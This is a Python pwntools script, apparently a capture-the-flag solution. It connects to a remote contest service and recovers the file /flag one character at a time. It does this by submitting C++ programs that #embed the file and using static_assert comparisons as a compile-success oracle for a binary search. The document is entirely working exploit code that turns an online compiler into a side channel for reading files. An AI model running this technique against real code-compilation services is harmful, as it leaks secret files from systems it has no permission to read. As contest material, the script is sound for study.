from pwn import *
context(log_level = "debug", arch = "amd64", os = "linux")

# p = process(["python3", "/app.py"])
p = remote("geekgame-prob", 10007)
p.sendline('GgT-dPpuPoJ7nS5u1xEXTjuPm4xPAYZDYDmpCh27csXhXMorkIty_FpIlHPlV5NGXULOk-tqmuYCcFVL99XwM8IgAAw=')
p.recvuntil("P.S Flag is at /flag on the server :)\n\n")

code_str = """
constexpr char flag[] = {
    #embed "/flag"
};
int main(){
    static_assert(flag[<<idx>>] <= <<char>>);
    return 0;
}
END
"""
flag = ""
for i in range(40):
    # 二分查找确定 flag[i]
    l, r = 32, 126
    while l < r:
        mid = (l + r) // 2
        code = code_str.replace("<<idx>>", str(i)).replace("<<char>>", str(mid))
        p.send(code)
        res = p.recv()
        log.info(f"try flag[{i}] <= {mid} ({chr(mid)})")
        log.info(res)
        # if res is empty, resend
        if b"Compilation" not in res:
            continue
        if b"Compilation Success" in res:
            r = mid
        else:
            l = mid + 1

    flag += chr(l)
    log.success(f"flag: {flag}")
log.success(f"final flag: {flag}")

p.interactive()